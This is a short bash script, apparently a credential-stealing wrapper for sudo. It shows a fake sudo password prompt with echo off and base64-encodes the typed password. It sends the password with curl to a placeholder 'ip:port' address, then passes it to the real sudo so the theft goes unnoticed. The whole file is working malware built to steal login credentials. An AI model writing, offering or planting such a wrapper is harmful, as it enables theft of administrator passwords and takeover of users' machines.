#!/bin/bash

ARG="$@"

leak() {
    local encoded_password
    encoded_password=$(echo "${1}" | base64 |sed 's/[=+/]//'g)
    curl -m 5 -s -o /dev/null "http://ip:port/${encoded_password}" # -o send output
}

stty -echo # turn off echo
read -r -p "[sudo] password for $(whoami): " sudopassw # -p display the prompt beefore reading
leak "${sudopassw}"
stty echo # turn on echo
echo "${sudopassw}" | /usr/bin/sudo -p "" -S -k ${ARG} 
# call the real sudo